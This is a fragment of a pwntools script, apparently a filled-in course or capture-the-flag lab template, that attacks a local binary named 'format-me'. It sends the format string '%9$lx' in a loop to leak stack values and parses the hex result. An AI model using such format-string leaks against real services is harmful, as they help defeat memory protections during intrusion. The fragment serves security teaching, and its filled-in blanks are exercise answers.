...
r = process([exe.path])
# gdb.attach(r, gdbscript='b format-me.c 46')
...
for _ in range(10):
    ...
    r.sendline(b"%9$lx") # Add your format string code here!
    leak = r.recvline()
    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
    val = leak[11:27] # you need to fill in idx_1, and idx_2 by yourself
    val = int(val, 16)
